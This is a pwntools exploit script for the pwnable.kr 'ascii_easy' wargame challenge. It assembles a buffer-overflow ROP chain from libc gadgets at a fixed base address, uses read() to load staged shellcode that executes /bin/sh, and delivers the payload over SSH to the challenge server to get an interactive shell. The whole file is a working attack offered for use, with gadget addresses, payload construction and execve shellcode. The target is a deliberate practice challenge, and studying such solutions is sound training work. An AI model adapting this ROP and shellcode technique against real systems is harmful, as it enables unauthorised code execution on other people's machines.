
from pwn import *
from time import sleep

def n(addr): return 0x5555e000 + addr

def escape(bs):
  bs = bs.replace(b'>', b'\>')
  bs = bs.replace(b'<', b'\<')
  bs = bs.replace(b'\\', b'\\\\')
  bs = bs.replace(b'{', b'\{')
  bs = bs.replace(b'}', b'\}')
  bs = bs.replace(b'*', b'\*')
  bs = bs.replace(b'$', b'\$')
  bs = bs.replace(b'[', b'\[')
  bs = bs.replace(b']', b'\]')
  bs = bs.replace(b"'", b"\\'")
  bs = bs.replace(b'"', b'\\"')
  bs = bs.replace(b'`', b'\`')
  return bs

# xor eax,eax
# ret
mov_eax_0 = 0x149270
# mov eax,0x1
# ret
mov_eax_p1 = 0xb9b57
# add eax,0x3
# ret
add_eax_3 = 0x147060
# add eax,0x8
# ret
add_eax_8 = 0x98430
# mov ebx,edx
# cmp eax,0xfffff001
# jae e8192
# ret
mov_ebx_edx = 0xe815c
# pop ecx
# add al,0xa
# ret
pop_ecx = 0x174a51
# mov edx,0xffffffff
# cmovne eax,edx
# ret
mov_edx_n1 = 0xb9940
# add edx,eax
# jl 958a0
# add eax,ecx
# ret
add_edx_eax = 0x95866
# pop edx
# add DWORD PTR [edx],ecx
# ret
pop_edx = 0x196525
# mov DWORD PTR [edx],eax
# lea eax,[edx+0x3]
# ret
mov_dp_edx_eax = 0x89b72

dest = 0x77322 # int

# Write 0x80 to dest+1
rop = ROP([])
rop.raw('A'*28) # padding
rop.raw('B'*4)  # saved ebp
rop.raw(n( pop_edx ))
rop.raw(n( dest + 1 ))
rop.raw(n( mov_eax_0 ))
for _ in range(16):
  rop.raw(n( add_eax_8 ))
rop.raw(n( mov_dp_edx_eax ))
# Call read(0, dest+2, edx)
rop.raw(n( mov_edx_n1 ))
rop.raw(n( mov_eax_p1 ))
rop.raw(n( add_edx_eax ))
rop.raw(n( mov_ebx_edx ))
rop.raw(n( pop_ecx ))
rop.raw(n( dest + 2 ))
rop.raw(n( mov_edx_n1 ))
rop.raw(n( mov_eax_0 ))
for _ in range(10):
  rop.raw(n( add_eax_8 ))
rop.raw(n( add_edx_eax ))
rop.raw(n( mov_eax_0 ))
rop.raw(n( add_eax_3 ))
# Call dest
rop.raw(n( dest ))
rop.raw('/bin/sh')

print(escape(rop.chain()).decode('utf-8'))

# context.log_level = 'DEBUG'

s = ssh('ascii_easy', 'pwnable.kr', 2222, 'guest')
p = s.process(['./ascii_easy', rop.chain().decode('utf-8')])

# p = process(['/home/ascii_easy/ascii_easy', escape(rop.chain()).decode('utf-8')])
# p = process(['./ascii_easy', rop.chain().decode('utf-8')])

# p = gdb.debug(['./ascii_easy', escape(rop.chain()).decode('utf-8')], '''
# b main
# b vuln
# c
# c
# b *0x555d5324
# ''')

sc  = '''
mov eax,11
lea ebx,[esp]
mov ecx,0
mov edx,0
int 0x80
'''
sc = asm(sc)

p.recvuntil('triggering bug...')
p.sendline(sc + b'\x90'*(79-len(sc)))
p.interactive()
